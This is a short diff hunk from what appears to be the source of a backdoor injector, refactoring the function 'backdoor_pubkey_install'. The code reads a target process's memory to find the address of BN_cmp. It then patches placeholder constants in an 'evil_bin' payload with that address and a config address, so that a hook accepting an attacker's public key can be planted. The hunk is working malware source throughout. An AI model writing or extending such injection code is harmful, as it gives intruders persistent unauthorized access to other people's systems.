@@ -137,15 +137,8 @@ void backdoor_pubkey_install(inject_ctx *ctx, char *pubkey) {
 	_peek(ctx->pid, ctx->elf_base + f_BN_cmp, &l_BN_cmp, 8);
 	info("BN_cmp@lib = 0x%lx", l_BN_cmp);
 
-	for(j = 0; j < hook_pubkey_bin_len - 8; j++) {
-		u64 *vptr = (u64*)&evil_bin[j];
-		if (*vptr == 0xbadc0dedbeefbabe) {
-			info("found BN_cmp ptr @ %lx", j);
-
-			*vptr = l_BN_cmp;
-			break;
-		}
-	}
+	patch_placeholder(evil_bin, hook_pubkey_bin_len, 0xbadc0dedbeefbabe, l_BN_cmp);
+	patch_placeholder(evil_bin, hook_pubkey_bin_len, 0xc0debabe13371337, ctx->config_addr);
 
 	callcache = get_callcache();
 	callcache_total = get_callcachetotal();
